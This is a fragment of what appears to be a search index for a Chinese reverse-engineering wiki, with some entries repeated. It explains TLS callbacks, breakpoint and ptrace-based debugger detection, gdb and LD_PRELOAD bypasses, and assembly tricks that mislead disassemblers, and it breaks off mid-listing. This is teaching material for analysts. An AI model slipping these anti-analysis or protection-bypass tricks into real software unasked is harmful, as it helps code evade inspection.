\u521d\u59cb\u5316\u64cd\u4f5c\u53ef\u4ee5\u901a\u8fc7\u6307\u5b9a\u4e00\u4e2a\u5df2\u7ecf\u590d\u5236\u5230\u52a8\u6001\u5206\u914d\u5185\u5b58\u4e2d\u53bb\u7684\u9759\u6001\u7f13\u51b2\u533a, \u548c/\u6216\u901a\u8fc7\u5728\u56de\u8c03\u51fd\u6570\u6570\u7ec4\u4e2d\u6267\u884c\u4ee3\u7801, \u6765\u521d\u59cb\u5316\u52a8\u6001\u5185\u5b58\u5185\u5bb9. \u7ecf\u5e38\u662f\u7531\u4e8e\u6ee5\u7528\u56de\u8c03\u51fd\u6570\u6570\u7ec4\u800c\u9020\u6210\u95ee\u9898. \u5728\u8fd0\u884c\u65f6, TLS\u56de\u8c03\u51fd\u6570\u6570\u7ec4\u5185\u5bb9\u53ef\u4ee5\u88ab\u4fee\u6539\u6216\u589e\u52a0, \u65b0\u52a0\u5165\u6216\u65b0\u4fee\u6539\u7684\u56de\u8c03\u51fd\u6570\u4f1a\u4f7f\u7528\u65b0\u5730\u5740\u8fdb\u884c\u8c03\u7528. \u56de\u8c03\u51fd\u6570\u7684\u6570\u76ee\u4e5f\u6ca1\u6709\u9650\u5236. \u6570\u7ec4\u7684\u6269\u5c55\u64cd\u4f5c\u53ef\u4ee5\u7528\u4ee5\u4e0b\u4ee3\u7801\u5b8c\u6210: l1: mov d [ offset cbEnd ], offset l2 ret l2: ... \u5f53l1\u5904\u7684\u56de\u8c03\u8fd4\u56de\u65f6\u5c31\u4f1a\u7ee7\u7eed\u8c03\u7528l2\u7684\u56de\u8c03\u51fd\u6570 todo: continue to finish it","title":"Thread Local Storage(TLS)"},{"location":"reverse/anti-debug/thread_local_storage/#thread-local-storagetls","text":"\u7ebf\u7a0b\u672c\u5730\u5b58\u50a8(TLS)\u7528\u4e8e\u5728\u7ebf\u7a0b\u542f\u52a8\u524d\u5bf9\u7279\u5b9a\u7ebf\u7a0b\u6570\u636e\u8fdb\u884c\u521d\u59cb\u5316, \u56e0\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u5305\u542b\u81f3\u5c111\u4e2a\u7ebf\u7a0b, \u5728\u4e3b\u7ebf\u7a0b\u8fd0\u884c\u524d\u521d\u59cb\u5316\u6570\u636e. \u521d\u59cb\u5316\u64cd\u4f5c\u53ef\u4ee5\u901a\u8fc7\u6307\u5b9a\u4e00\u4e2a\u5df2\u7ecf\u590d\u5236\u5230\u52a8\u6001\u5206\u914d\u5185\u5b58\u4e2d\u53bb\u7684\u9759\u6001\u7f13\u51b2\u533a, \u548c/\u6216\u901a\u8fc7\u5728\u56de\u8c03\u51fd\u6570\u6570\u7ec4\u4e2d\u6267\u884c\u4ee3\u7801, \u6765\u521d\u59cb\u5316\u52a8\u6001\u5185\u5b58\u5185\u5bb9. \u7ecf\u5e38\u662f\u7531\u4e8e\u6ee5\u7528\u56de\u8c03\u51fd\u6570\u6570\u7ec4\u800c\u9020\u6210\u95ee\u9898. \u5728\u8fd0\u884c\u65f6, TLS\u56de\u8c03\u51fd\u6570\u6570\u7ec4\u5185\u5bb9\u53ef\u4ee5\u88ab\u4fee\u6539\u6216\u589e\u52a0, \u65b0\u52a0\u5165\u6216\u65b0\u4fee\u6539\u7684\u56de\u8c03\u51fd\u6570\u4f1a\u4f7f\u7528\u65b0\u5730\u5740\u8fdb\u884c\u8c03\u7528. \u56de\u8c03\u51fd\u6570\u7684\u6570\u76ee\u4e5f\u6ca1\u6709\u9650\u5236. \u6570\u7ec4\u7684\u6269\u5c55\u64cd\u4f5c\u53ef\u4ee5\u7528\u4ee5\u4e0b\u4ee3\u7801\u5b8c\u6210: l1: mov d [ offset cbEnd ], offset l2 ret l2: ... \u5f53l1\u5904\u7684\u56de\u8c03\u8fd4\u56de\u65f6\u5c31\u4f1a\u7ee7\u7eed\u8c03\u7528l2\u7684\u56de\u8c03\u51fd\u6570 todo: continue to finish it","title":"Thread Local Storage(TLS)"},{"location":"reverse/linux/detect-bp/","text":"gdb\u901a\u8fc7\u66ff\u6362\u76ee\u6807\u5730\u5740\u7684\u5b57\u8282\u4e3a 0xcc \u6765\u5b9e\u73b0\u65ad\u70b9, \u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u7b80\u5355\u7684\u68c0\u6d4b int 3 \u65ad\u70b9\u7684\u793a\u4f8b: void foo () { printf ( \"Hello \\n \" ); } int main () { if (( * ( volatile unsigned * )(( unsigned ) foo ) & 0xff ) == 0xcc ) { printf ( \"BREAKPOINT \\n \" ); exit ( 1 ); } foo (); } \u6b63\u5e38\u8fd0\u884c\u7a0b\u5e8f\u4f1a\u8f93\u51faHello, \u4f46\u662f\u5982\u679c\u4e4b\u524d\u6709\u5728 foo \u51fd\u6570\u8fd9\u91cc\u8bbe\u7f6e cc \u65ad\u70b9\u5e76\u8fd0\u884c, gdb\u5219\u65e0\u6cd5\u65ad\u4e0b, \u5e76\u4f1a\u8f93\u51fa BREAKPOINT . # gdb ./x gdb> bp foo Breakpoint 1 at 0x804838c gdb> run BREAKPOINT Program exited with code 01. \u8fd9\u4e2a\u8981\u7ed5\u8fc7\u4e5f\u5f88\u7b80\u5355, \u90a3\u5c31\u662f\u9700\u8981\u9605\u8bfb\u6c47\u7f16\u4ee3\u7801\u5e76\u6ce8\u610f\u8bbe\u7f6e\u65ad\u70b9\u4e0d\u8981\u5728 foo \u51fd\u6570\u5165\u53e3\u5904. \u5b9e\u9645\u60c5\u51b5\u5c31\u8981\u770b\u68c0\u6d4b\u65ad\u70b9\u7684\u4f4d\u7f6e\u662f\u54ea\u91cc. \u8fd9\u79cd\u76d1\u89c6\u65ad\u70b9\u7684\u53cd\u8c03\u8bd5\u6280\u672f, \u5173\u952e\u4e0d\u5728\u4e8e\u5982\u4f55\u7ed5\u8fc7\u5b83, \u800c\u662f\u5728\u4e8e\u5982\u4f55\u68c0\u6d4b\u5b83. \u5728\u8fd9\u4e2a\u793a\u4f8b\u4e2d\u53ef\u4ee5\u5f88\u8f7b\u677e\u7684\u53d1\u73b0, \u7a0b\u5e8f\u4e5f\u6709\u6253\u5370\u51fa\u76f8\u5e94\u7684\u4fe1\u606f. \u5728\u5b9e\u9645\u60c5\u51b5\u4e2d, \u7a0b\u5e8f\u4e0d\u4f1a\u8f93\u51fa\u4efb\u4f55\u4fe1\u606f, \u65ad\u70b9\u4e5f\u65e0\u6cd5\u8f7b\u6613\u5730\u65ad\u4e0b. \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 perl \u811a\u672c\u8fc7\u6ee4\u53cd\u6c47\u7f16\u4ee3\u7801\u4e2d\u6709\u5173 0xcc \u7684\u4ee3\u7801\u51fa\u6765\u8fdb\u884c\u68c0\u67e5. \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528perl\u811a\u672c\u8fc7\u6ee4\u53cd\u6c47\u7f16\u4ee3\u7801\u4e2d\u6709\u51730xcc\u7684\u4ee3\u7801\u51fa\u6765\u8fdb\u884c\u68c0\u67e5 #!/usr/bin/perl while ( <> ) { if ( $_ =~ m/([0-9a-f][4]:\\s*[0-9a-f \\t]*.*0xcc)/ ){ print ; } } \u663e\u793a\u7ed3\u679c # objdump -M intel -d xxx | ./antibp.pl 80483be: 3d cc 00 00 00 cmp eax,0xcc \u68c0\u6d4b\u5230\u540e, \u65e2\u53ef\u4ee5\u5c060xcc\u4fee\u6539\u62100x00\u62160x90, \u4e5f\u53ef\u4ee5\u505a\u4efb\u4f55\u4f60\u60f3\u505a\u7684\u64cd\u4f5c. \u6539\u53d80xcc\u4e5f\u540c\u6837\u53ef\u80fd\u5e26\u6765\u95ee\u9898, \u5c31\u5982\u4e0a\u7bc7\u4ecb\u7ecd\u4e00\u6837, \u7a0b\u5e8f\u5982\u679c\u6709\u8fdb\u884c\u6587\u4ef6\u6821\u9a8c, \u90a3\u4e48\u6211\u4eec\u7684\u6539\u53d8\u662f\u4f1a\u88ab\u68c0\u6d4b\u5230\u7684. \u53ef\u80fd\u7684\u60c5\u51b5\u4e0b, \u7a0b\u5e8f\u4e5f\u4e0d\u53ea\u662f\u5bf9\u51fd\u6570\u5165\u53e3\u70b9\u8fdb\u884c\u68c0\u6d4b, \u4e5f\u4f1a\u5728\u4e00\u4e2a\u5faa\u73af\u91cc\u5bf9\u6574\u4e2a\u51fd\u6570\u8fdb\u884c\u68c0\u6d4b. \u56e0\u6b64\u4f60\u4e5f\u53ef\u4ee5\u7528\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\u624b\u52a8\u653e\u7f6e\u4e00\u4e2a ICEBP(0xF1) \u5b57\u8282\u5230\u9700\u8981\u65ad\u4e0b\u7684\u4f4d\u7f6e(\u800c\u975e int 3 ). \u56e0\u4e3a ICEBP \u4e5f\u4e00\u6837\u80fd\u8ba9gdb\u65ad\u4e0b\u6765. Reference: Beginners Guide to Basic Linux Anti Anti Debugging Techniques","title":"Detecting Breakpoints"},{"location":"reverse/linux/detect-dbg/","text":"\u68c0\u6d4b\u8c03\u8bd5\u5668\u7684\u65b9\u6cd5\u5f88\u591a, \u6bd4\u5982\u68c0\u6d4b\u8fdb\u7a0b\u540d\u4e4b\u7c7b. \u8fd9\u91cc\u6211\u4eec\u4ecb\u7ecd\u4e00\u79cd\u65b9\u6cd5, \u5c31\u662f\u901a\u8fc7\u68c0\u6d4b\u4e00\u4e9b\u51fd\u6570\u7684\u8c03\u7528\u60c5\u51b5\u6765\u5206\u6790\u7a0b\u5e8f\u5f53\u524d\u662f\u5426\u5904\u4e8e\u88ab\u8c03\u8bd5\u72b6\u6001 int main () { if ( ptrace ( PTRACE_TRACEME , 0 , 1 , 0 ) < 0 ) { printf ( \"DEBUGGING... Bye \\n \" ); return 1 ; } printf ( \"Hello \\n \" ); return 0 ; } \u4e00\u4e2a\u8fdb\u7a0b\u53ea\u80fd\u88ab\u4e00\u4e2a\u8fdb\u7a0bptrace, \u5982\u679c\u4f60\u81ea\u5df1\u8c03\u7528ptrace, \u90a3\u4e48\u5176\u5b83\u7a0b\u5e8f\u5c31\u65e0\u6cd5\u901a\u8fc7ptrace\u8c03\u8bd5\u6216\u5411\u4f60\u7684\u7a0b\u5e8f\u6ce8\u5165\u4ee3\u7801. \u5982\u679c\u7a0b\u5e8f\u5f53\u524d\u88abgdb\u8c03\u8bd5, \u90a3\u4e48ptrace\u51fd\u6570\u5c31\u4f1a\u8fd4\u56de\u9519\u8bef, \u4e5f\u5c31\u4fa7\u9762\u8868\u660e\u4e86\u68c0\u6d4b\u5230\u4e86\u8c03\u8bd5\u5668\u7684\u5b58\u5728. \u7ed5\u8fc7\u65b9\u6cd51 \u00b6 \u663e\u7136ptrace\u53ea\u80fd\u4f5c\u7528\u4e8e\u4f7f\u7528ptrace\u7684\u8c03\u8bd5\u5668, \u6211\u4eec\u53ef\u4ee5\u7528\u4e0d\u4f7f\u7528ptrace\u7684\u8c03\u8bd5\u5668. \u6211\u4eec\u4e5f\u53ef\u4ee5\u901a\u8fc7\u6253\u8865\u4e01\u7684\u65b9\u5f0f\u5c06ptrace\u51fd\u6570\u64e6\u9664, \u66f4\u7b80\u5355\u5c31\u662f\u5c06ptrace\u7684\u8c03\u7528\u4ee3\u7801\u6216\u662f\u4e4b\u540e\u7684\u6821\u9a8c\u7ed9\u64e6\u9664\u4e86. \u5982\u679c\u53ef\u6267\u884c\u6587\u4ef6(\u5b9e\u9645\u60c5\u51b5\u4e0b\u4e0d\u592a\u53ef\u80fd)\u5728\u7f16\u8bd1\u65f6\u5e76\u6ca1\u6709\u542f\u7528-s\u9009\u9879(-s \u9009\u9879\u80fd\u79fb\u9664\u6240\u6709\u7684\u7b26\u53f7\u8868\u4fe1\u606f\u548c\u91cd\u5b9a\u4f4d\u4fe1\u606f), \u90a3\u4e48\u60c5\u51b5\u4f1a\u53d8\u5f97\u7b80\u5355\u5f88\u591a. \u6211\u4eec\u4ece\u8fd9\u4e2a\u7b80\u5355\u7684\u60c5\u51b5\u6765\u5206\u6790 # objdump -t test_debug | grep ptrace 080482c0 F *UND* 00000075 ptrace@@GLIBC_2.0 ptrace\u5728 0x080482c0 \u4f4d\u7f6e\u88ab\u8c03\u7528 # objdump -d -M intel test_debug |grep 80482c0 80482c0: ff 25 04 96 04 08 jmp ds:0x8049604 80483d4: e8 e7 fe ff ff call 80482c0 <_init+0x28> \u90a3\u8981\u662f\u6709\u542f\u7528-s\u9009\u9879, \u8be5\u600e\u4e48\u5904\u7406\u5462? \u8fd9\u65f6\u6211\u4eec\u9700\u8981\u4f7f\u7528gdb # gdb test_debug gdb> bp ptrace Breakpoint 1 at 0x80482c0 gdb> run Breakpoint 1 at 0x400e02f0 ...... 0x400e02f0 <ptrace>: push %ebp 0x400e02f1 <ptrace+1>: mov %esp,%ebp 0x400e02f3 <ptrace+3>: sub $0x10,%esp 0x400e02f6 <ptrace+6>: mov %edi,0xfffffffc(%ebp) 0x400e02f9 <ptrace+9>: mov 0x8(%ebp),%edi 0x400e02fc <ptrace+12>: mov 0xc(%ebp),%ecx ------------------------------------------------------------------------------ Breakpoint 1, 0x400e02f0 in ptrace () from /lib/tls/libc.so.6 \u6211\u4eec\u7b80\u5355\u5730\u65ad\u5728\u4e86ptrace\u5904, \u73b0\u5728\u8f93\u5165finish\u6267\u884c\u5230\u5f53\u524d\u51fd\u6570\u8fd4\u56de, \u56de\u5230main\u51fd\u6570\u91cc # gdb test_debug gdb> finish 00x80483d9 <main+29>: add $0x10,%esp 0x80483dc <main+32>: test %eax,%eax 0x80483de <main+34>: jns 0x80483fa <main+62> 0x80483e0 <main+36>: sub $0xc,%esp 0x80483e3 <main+39>: push $0x80484e8 0x80483e8 <main+44>: call 0x80482e0 ------------------------------------------------------------------------------ 0x080483d9 in main () \u5c06\u51fd\u6570\u8fd4\u56de\u7ed3\u679ceax\u4fee\u6539\u4e3a\u6b63\u786e\u7684\u8fd4\u56de\u7ed3\u679c, \u5c31\u53ef\u4ee5\u4e86 gdb> set $eax=0 gdb> c everything ok Program exited with code 016. _______________________________________________________________________________ No registers. gdb> \u7ed5\u8fc7\u65b9\u6cd52 \u00b6 \u65b9\u6cd52\u5c31\u662f\u7f16\u5199\u81ea\u5df1\u7684ptrace\u51fd\u6570 \u5982\u524d\u51e0\u7bc7\u6240\u8ff0, LD_PRELOAD \u73af\u5883\u53d8\u91cf\u53ef\u4ee5\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u6307\u5411\u6211\u4eec\u81ea\u5df1\u7684ptrace\u51fd\u6570. \u6211\u4eec\u5199\u4e00\u4e2aptrace\u51fd\u6570\u5e76\u751f\u6210\u76ee\u6807\u6587\u4ef6 // -- ptrace.c -- // gcc -shared ptrace.c -o ptrace.so int ptrace ( int i , int j , int k , int l ) { printf ( \" PTRACE CALLED! \\n \" ); } \u6211\u4eec\u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u73af\u5883\u53d8\u91cfLD_PRELOAD\u6765\u4f7f\u7528\u6211\u4eec\u81ea\u5df1\u7684ptrace\u51fd\u6570, \u5f53\u7136\u8fd9\u91cc\u662f\u53ef\u4ee5\u5728gdb\u4e2d\u8fdb\u884c\u8bbe\u7f6e gdb> set environment LD_PRELOAD ./ptrace.so gdb> run PTRACE CALLED! Hello World! Program exited with code 015. gdb> \u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u65e0\u6cd5\u68c0\u6d4b\u5230\u8c03\u8bd5\u5668\u4e86. Reference: Beginners Guide to Basic Linux Anti Anti Debugging Techniques","title":"Detecting debugging"},{"location":"reverse/linux/detect-dbg/#1","text":"\u663e\u7136ptrace\u53ea\u80fd\u4f5c\u7528\u4e8e\u4f7f\u7528ptrace\u7684\u8c03\u8bd5\u5668, \u6211\u4eec\u53ef\u4ee5\u7528\u4e0d\u4f7f\u7528ptrace\u7684\u8c03\u8bd5\u5668. \u6211\u4eec\u4e5f\u53ef\u4ee5\u901a\u8fc7\u6253\u8865\u4e01\u7684\u65b9\u5f0f\u5c06ptrace\u51fd\u6570\u64e6\u9664, \u66f4\u7b80\u5355\u5c31\u662f\u5c06ptrace\u7684\u8c03\u7528\u4ee3\u7801\u6216\u662f\u4e4b\u540e\u7684\u6821\u9a8c\u7ed9\u64e6\u9664\u4e86. \u5982\u679c\u53ef\u6267\u884c\u6587\u4ef6(\u5b9e\u9645\u60c5\u51b5\u4e0b\u4e0d\u592a\u53ef\u80fd)\u5728\u7f16\u8bd1\u65f6\u5e76\u6ca1\u6709\u542f\u7528-s\u9009\u9879(-s \u9009\u9879\u80fd\u79fb\u9664\u6240\u6709\u7684\u7b26\u53f7\u8868\u4fe1\u606f\u548c\u91cd\u5b9a\u4f4d\u4fe1\u606f), \u90a3\u4e48\u60c5\u51b5\u4f1a\u53d8\u5f97\u7b80\u5355\u5f88\u591a. \u6211\u4eec\u4ece\u8fd9\u4e2a\u7b80\u5355\u7684\u60c5\u51b5\u6765\u5206\u6790 # objdump -t test_debug | grep ptrace 080482c0 F *UND* 00000075 ptrace@@GLIBC_2.0 ptrace\u5728 0x080482c0 \u4f4d\u7f6e\u88ab\u8c03\u7528 # objdump -d -M intel test_debug |grep 80482c0 80482c0: ff 25 04 96 04 08 jmp ds:0x8049604 80483d4: e8 e7 fe ff ff call 80482c0 <_init+0x28> \u90a3\u8981\u662f\u6709\u542f\u7528-s\u9009\u9879, \u8be5\u600e\u4e48\u5904\u7406\u5462? \u8fd9\u65f6\u6211\u4eec\u9700\u8981\u4f7f\u7528gdb # gdb test_debug gdb> bp ptrace Breakpoint 1 at 0x80482c0 gdb> run Breakpoint 1 at 0x400e02f0 ...... 0x400e02f0 <ptrace>: push %ebp 0x400e02f1 <ptrace+1>: mov %esp,%ebp 0x400e02f3 <ptrace+3>: sub $0x10,%esp 0x400e02f6 <ptrace+6>: mov %edi,0xfffffffc(%ebp) 0x400e02f9 <ptrace+9>: mov 0x8(%ebp),%edi 0x400e02fc <ptrace+12>: mov 0xc(%ebp),%ecx ------------------------------------------------------------------------------ Breakpoint 1, 0x400e02f0 in ptrace () from /lib/tls/libc.so.6 \u6211\u4eec\u7b80\u5355\u5730\u65ad\u5728\u4e86ptrace\u5904, \u73b0\u5728\u8f93\u5165finish\u6267\u884c\u5230\u5f53\u524d\u51fd\u6570\u8fd4\u56de, \u56de\u5230main\u51fd\u6570\u91cc # gdb test_debug gdb> finish 00x80483d9 <main+29>: add $0x10,%esp 0x80483dc <main+32>: test %eax,%eax 0x80483de <main+34>: jns 0x80483fa <main+62> 0x80483e0 <main+36>: sub $0xc,%esp 0x80483e3 <main+39>: push $0x80484e8 0x80483e8 <main+44>: call 0x80482e0 ------------------------------------------------------------------------------ 0x080483d9 in main () \u5c06\u51fd\u6570\u8fd4\u56de\u7ed3\u679ceax\u4fee\u6539\u4e3a\u6b63\u786e\u7684\u8fd4\u56de\u7ed3\u679c, \u5c31\u53ef\u4ee5\u4e86 gdb> set $eax=0 gdb> c everything ok Program exited with code 016. _______________________________________________________________________________ No registers. gdb>","title":"\u7ed5\u8fc7\u65b9\u6cd51"},{"location":"reverse/linux/detect-dbg/#2","text":"\u65b9\u6cd52\u5c31\u662f\u7f16\u5199\u81ea\u5df1\u7684ptrace\u51fd\u6570 \u5982\u524d\u51e0\u7bc7\u6240\u8ff0, LD_PRELOAD \u73af\u5883\u53d8\u91cf\u53ef\u4ee5\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u6307\u5411\u6211\u4eec\u81ea\u5df1\u7684ptrace\u51fd\u6570. \u6211\u4eec\u5199\u4e00\u4e2aptrace\u51fd\u6570\u5e76\u751f\u6210\u76ee\u6807\u6587\u4ef6 // -- ptrace.c -- // gcc -shared ptrace.c -o ptrace.so int ptrace ( int i , int j , int k , int l ) { printf ( \" PTRACE CALLED! \\n \" ); } \u6211\u4eec\u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u73af\u5883\u53d8\u91cfLD_PRELOAD\u6765\u4f7f\u7528\u6211\u4eec\u81ea\u5df1\u7684ptrace\u51fd\u6570, \u5f53\u7136\u8fd9\u91cc\u662f\u53ef\u4ee5\u5728gdb\u4e2d\u8fdb\u884c\u8bbe\u7f6e gdb> set environment LD_PRELOAD ./ptrace.so gdb> run PTRACE CALLED! Hello World! Program exited with code 015. gdb> \u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u65e0\u6cd5\u68c0\u6d4b\u5230\u8c03\u8bd5\u5668\u4e86. Reference: Beginners Guide to Basic Linux Anti Anti Debugging Techniques","title":"\u7ed5\u8fc7\u65b9\u6cd52"},{"location":"reverse/linux/false-disasm/","text":"\u5bf9\u4e8e\u4e00\u4e9b\u5e38\u7528\u7684\u53cd\u6c47\u7f16\u5668, \u5982 objdump , \u6216\u662f\u57fa\u4e8e objdump \u7684\u53cd\u6c47\u7f16\u5668\u9879\u76ee. \u90fd\u5b58\u5728\u4e00\u4e9b\u53cd\u6c47\u7f16\u7684\u7f3a\u9677. \u6709\u4e00\u4e9b\u65b9\u5f0f\u53ef\u4ee5\u8ba9 objdump \u53cd\u6c47\u7f16\u51fa\u7684\u4ee3\u7801, \u5e76\u6ca1\u6709\u90a3\u4e48\u7684\u51c6\u786e. \u8df3\u5230\u4e00\u6761\u6307\u4ee4\u4e2d\u95f4 \u00b6 \u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u662f\u5229\u7528 jmp \u8df3\u8f6c\u5230\u67d0\u4e00\u6761\u6307\u4ee4\u4e2d\u95f4\u6267\u884c, \u4e5f\u5c31\u662f\u8bf4\u771f\u5b9e\u7684\u4ee3\u7801\u662f\u4ece\u67d0\u6761\u6307\u4ee4\"\u4e4b\u4e2d\"\u5f00\u59cb\u7684, \u4f46\u5728\u53cd\u6c47\u7f16\u65f6\u7531\u4e8e\u662f\u9488\u5bf9\u6574\u6761\u6307\u4ee4\u800c\u4e0d\u80fd\u5217\u51fa\u771f\u6b63\u88ab\u8fd0\u884c\u7684\u6c47\u7f16\u6307\u4ee4\u4ee3\u7801. \u8bf4\u8d77\u6765\u597d\u50cf\u5f88\u62d7\u53e3, \u5f88\u96be\u61c2, \u6211\u4eec\u6765\u770b\u4e00\u4e2a\u793a\u4f8b\u5427, \u7ed9\u51fa\u4ee5\u4e0b\u7684\u6c47\u7f16\u4ee3\u7801. start: jmp label+1 label: DB 0x90 mov eax, 0xf001 \u8fd9\u6bb5\u4ee3\u7801 label \u6240\u5728\u7684\u7b2c\u4e00\u6761\u6307\u4ee4\u662f DB 0x90 . \u6211\u4eec\u6765\u770b\u770b objdump \u5bf9\u8fd9\u6bb5\u4ee3\u7801\u53cd\u6c47\u7f16\u7684\u7ed3\u679c: 08048080 <start>: 8048080: e9 01 00 00 00 jmp 8048086 <label+0x1> 08048085 <label>: 8048085: 90 nop 8048086: b8 01 f0 00 00 mov eax,0xf001 \u770b\u8d77\u6765\u4e5f\u6ca1\u4ec0\u4e48\u95ee\u9898, DB 0x90 \u88ab\u51c6\u786e\u5730\u53cd\u6c47\u7f16\u6210 90 nop . \u4f46\u662f\u5982\u679c\u6211\u4eec\u5c06 nop \u6307\u4ee4\u4fee\u6539\u4e3a1\u5b57\u8282\u4ee5\u4e0a\u7684\u6307\u4ee4, \u90a3\u4e48objdump\u5c31\u4e0d\u4f1a\u8ddf\u968f\u6211\u4eec\u7684jump\u5e76\u6b63\u786e\u7684\u53cd\u6c47\u7f16, \u800c\u662f\u7ebf\u6027\u5730\u4ece\u4e0a\u5f80\u4e0b\u7ee7\u7eed\u6c47\u7f16(\u7ebf\u6027\u626b\u63cf\u7b97\u6cd5). \u6bd4\u5982\u6211\u5c06 DB 0x90 \u6539\u6210\u4e86 DB 0xE9 , \u6765\u770b\u770bobjdump\u518d\u6b21\u53cd\u6c47\u7f16\u7684\u7ed3\u679c: 08048080 <start>: 8048080: e9 01 00 00 00 jmp 8048086 <label+0x1> 08048085 <label>: 8048085: e9 b8 01 f0 00 jmp 8f48242 <__bss_start+0xeff1b6> \u5bf9\u6bd4\u4e4b\u524d\u7684\u53cd\u6c47\u7f16\u7ed3\u679c, \u4f60\u5f88\u660e\u663e\u5730\u770b\u51fa\u6765\u662f\u4ec0\u4e48\u60c5\u51b5\u4e86\u5427. DB 0xE9 \u5355\u7eaf\u53ea\u662f\u4e00\u4e2a\u6570\u636e, \u4e5f\u4e0d\u4f1a\u88ab\u6267\u884c, \u800c\u53cd\u6c47\u7f16\u51fa\u7684\u7ed3\u679c, \u5374\u5c06\u5176\u89c6\u4f5c\u4e00\u4e2a\u6307\u4ee4, \u4e4b\u540e\u7684\u7ed3\u679c\u4e5f\u56e0\u6b64\u800c\u6539\u53d8\u4e86. objdump \u5ffd\u7565\u4e86jmp\u7684\u76ee\u7684\u5730\u5740\u5904\u7684\u4ee3\u7801 \u5e76\u76f4\u63a5\u6c47\u7f16jmp\u540e\u7684\u6307\u4ee4, \u8fd9\u6837\u6211\u4eec\u771f\u6b63\u7684\u4ee3\u7801\u4e5f\u5c31\u88ab\u5f88\u597d\u5730\"\u9690\u85cf\"\u4e86\u8d77\u6765 \u89e3\u51b3\u65b9\u6cd5 \u00b6 \u8be5\u5982\u4f55\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u5462? \u770b\u8d77\u6765\u6700\u76f4\u63a5\u7684\u65b9\u6cd5\u5c31\u662f\u5c06\u8fd9\u4e2a\u65e0\u7528\u7684 0xE9 \u7528\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\u624b\u52a8\u66ff\u6362\u6210 0x90 . \u4f46\u662f\u5982\u679c\u7a0b\u5e8f\u6709\u8fdb\u884c\u6587\u4ef6\u6821\u9a8c, \u8ba1\u7b97checksum\u503c, \u90a3\u4e48\u8fd9\u4e2a\u65b9\u6cd5\u5c31\u884c\u4e0d\u901a\u4e86. \u6240\u4ee5\u66f4\u597d\u7684\u89e3\u51b3\u529e\u6cd5\u662f\u4f7f\u7528\u5982IDA\u6216\u7c7b\u4f3c\u6709\u505a\u63a7\u5236\u6d41\u5206\u6790\u7684\u53cd\u6c47\u7f16\u5668, \u5bf9\u4e8e\u540c\u6837\u6709\u95ee\u9898\u7684\u7a0b\u5e8f. \u53cd\u6c47\u7f16\u7ed3\u679c\u53ef\u80fd\u5982\u4e0b: ---- section .text ----: 08048080 E9 01 00 00 00 jmp Label_08048086 ; (08048086) ; (near + 0x1) 08048085 DB E9 Label_08048086: 08048086 B8 01 F0 00 00 mov eax, 0xF001 ; xref ( 08048080 ) \u53cd\u6c47\u7f16\u7ed3\u679c\u770b\u4e0a\u53bb\u8fd8\u884c \u8fd0\u884c\u65f6\u8ba1\u7b97\u8df3\u8f6c\u5730\u5740 \u00b6 \u8fd9\u79cd\u65b9\u6cd5, \u751a\u81f3\u53ef\u4ee5\u5bf9\u6297\u5206\u6790\u63a7\u5236\u6d41\u7684\u53cd\u6c47\u7f16\u5668. \u6211\u4eec\u53ef\u4ee5\u770b\u4e00\u4e2a\u793a\u4f8b\u4ee3\u7801, \u66f4\u597d\u5730\u7406\u89e3: ; ---------------------------------------------------------------------------- call earth+1 Return: ; x instructions or random bytes here x byte(s) earth: ; earth = Return + x xor eax, eax ; align disassembly, using single byte opcode 1 byte pop eax ; start of function: get return address ( Return ) 1 byte ; y instructions or random bytes here y byte(s) add eax, x+2+y+2+1+1+z ; x+y+z+6 2 bytes push eax ; 1 byte ret ; 1 byte ; z instructions or random bytes here z byte(s) ; Code: ; !! Code Continues Here !! ; ---------------------------------------------------------------------------- \u7a0b\u5e8f\u901a\u8fc7 call+pop \u6765\u83b7\u53d6\u8c03\u7528\u51fd\u6570\u5f53\u65f6\u4fdd\u5b58\u5230\u6808\u4e0a\u7684\u8fd4\u56de\u5730\u5740, \u5176\u5b9e\u5c31\u662f\u8c03\u7528\u51fd\u6570\u524d\u7684 EIP . \u7136\u540e\u5728\u51fd\u6570\u8fd4\u56de\u5904\u585e\u5165\u5783\u573e\u6570\u636e. \u4f46\u5b9e\u9645\u4e0a\u5728\u51fd\u6570\u8fd0\u884c\u65f6\u5df2\u7ecf\u5c06\u8fd4\u56de\u5730\u5740\u4fee\u6539\u5230\u4e86Code\u5904. \u56e0\u6b64 earth \u51fd\u6570\u8fd4\u56de\u4f1a\u8df3\u8f6c\u5230 Code \u5904\u7ee7\u7eed\u8fd0\u884c\uff0c\u800c\u4e0d\u662f Return \u5904\u7ee7\u7eed\u8fd0\u884c. \u6765\u770b\u4e00\u4e2a\u7b80\u6613\u7684demo ; ---------------------------------------------------------------------------- call earth+1 earth: DB 0xE9 ; 1 <--- pushed return address, ; E9 is opcode for jmp to disalign disas- ; sembly pop eax ; 1 hidden nop ; 1 add eax, 9 ; 2 hidden push eax ; 1 hidden ret ; 1 hidden DB 0xE9 ; 1 opcode for jmp to misalign disassembly Code: ; code continues here <--- pushed return address + 9 nop nop nop ret ; ---------------------------------------------------------------------------- \u5982\u679c\u662f\u4f7f\u7528objdump\u8fdb\u884c\u53cd\u6c47\u7f16, \u5149\u662f call earth+1 \u5c31\u4f1a\u51fa\u73b0\u95ee\u9898, \u5982\u4e0b: 00000000 <earth-0x5>: 0: e8 01 00 00 00 call 6 <earth+0x1> 00000005 <earth>: 5: e9 58 90 05 09 jmp 9059062 <earth+0x905905d> a: 00 00 add %al,(%eax) c: 00 50 c3 add %dl,0xffffffc3(%eax) f: e9 90 90 90 c3 jmp c39090a4 <earth+0xc390909f> \u6765\u770b\u4e00\u4e0b ida \u7684\u60c5\u51b5 text:08000000 ; Segment permissions: Read/Execute .text:08000000 _text segment para public 'CODE' use32 .text:08000000 assume cs:_text .text:08000000 ;org 8000000h .text:08000000 assume es:nothing, 